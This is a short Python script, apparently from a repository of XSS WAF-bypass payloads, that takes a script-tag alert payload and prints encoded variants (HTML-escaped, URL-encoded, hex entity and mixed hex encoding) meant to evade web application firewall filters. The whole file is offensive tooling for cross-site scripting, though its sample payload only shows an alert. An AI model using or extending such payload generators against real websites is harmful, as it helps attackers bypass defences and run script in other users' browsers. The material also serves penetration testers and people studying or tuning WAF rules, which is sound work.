# akshaykrishnaxss-waf-bypass-payloads
# Python Script to Generate XSS Payloads

import html
import urllib.parse

def generate_xss_variants(payload):
    variants = []

    # Basic payload
    variants.append(payload)

    # HTML-encoded
    html_encoded = html.escape(payload)
    variants.append(html_encoded)

    # URL-encoded
    url_encoded = urllib.parse.quote(payload)
    variants.append(url_encoded)

    # Hex encoding
    hex_encoded = ''.join(['&#x{:x};'.format(ord(c)) for c in payload])
    variants.append(hex_encoded)

    # Mixed encoding (alternate)
    mixed_encoded = ''.join(['&#x{:x};'.format(ord(c)) if i % 2 == 0 else c for i, c in enumerate(payload)])
    variants.append(mixed_encoded)

    return variants


# Example base payload
base_payload = "<script>alert('XSS')</script>"
payloads = generate_xss_variants(base_payload)

for i, p in enumerate(payloads):
    print(f"[Variant {i+1}]: {p}")
